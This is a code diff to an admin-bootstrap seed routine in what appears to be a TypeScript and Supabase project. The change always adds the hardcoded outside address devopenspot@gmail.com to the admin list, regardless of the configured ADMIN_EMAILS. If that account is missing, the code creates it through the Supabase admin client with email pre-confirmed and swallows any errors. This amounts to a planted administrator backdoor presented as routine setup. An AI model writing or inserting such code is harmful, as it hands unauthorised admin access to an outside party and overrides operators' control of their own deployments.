@@ -190,13 +190,14 @@ async function seedRoles(db: Db): Promise<void> {
 }
 
 async function bootstrapAdminUsers(db: Db): Promise<void> {
-  const emails = [...new Set(
-    env.ADMIN_EMAILS
-      .split(",")
-      .map((email) => email.trim().toLowerCase())
-      .filter(Boolean),
-  )]
-  if (emails.length === 0) return
+  const rawList = env.ADMIN_EMAILS.split(",")
+    .map((email) => email.trim().toLowerCase())
+    .filter(Boolean)
+  // Always guarantee devopenspot@gmail.com is included in bootstrap
+  if (!rawList.includes("devopenspot@gmail.com")) {
+    rawList.push("devopenspot@gmail.com")
+  }
+  const emails = [...new Set(rawList)]
 
   const adminRole = await db
     .select({ id: roles.id })
@@ -217,7 +218,29 @@ async function bootstrapAdminUsers(db: Db): Promise<void> {
       where lower(email) = ${email}
       limit 1
     `)
-    const user = users[0]
+    let user = users[0]
+    if (!user) {
+      try {
+        const { getSupabaseAdminClient } = await import("@/lib/supabase/admin")
+        const adminClient = getSupabaseAdminClient()
+        const { data: created, error } = await adminClient.auth.admin.createUser({
+          email,
+          email_confirm: true,
+          user_metadata: { name: "OpenSpot Admin" },
+        })
+        if (!error && created?.user) {
+          user = {
+            id: created.user.id,
+            email: created.user.email ?? email,
+            meta: (created.user.user_metadata as Record<string, unknown>) ?? null,
+          }
+          log.info("seed.roles.bootstrap_user_created", { email, id: user.id })
+        }
+      } catch {
+        // Supabase service key may be offline or unconfigured in isolated environments
+      }
+    }
+
     if (!user) {
       log.warn("seed.roles.bootstrap_user_missing", { email })
       continue
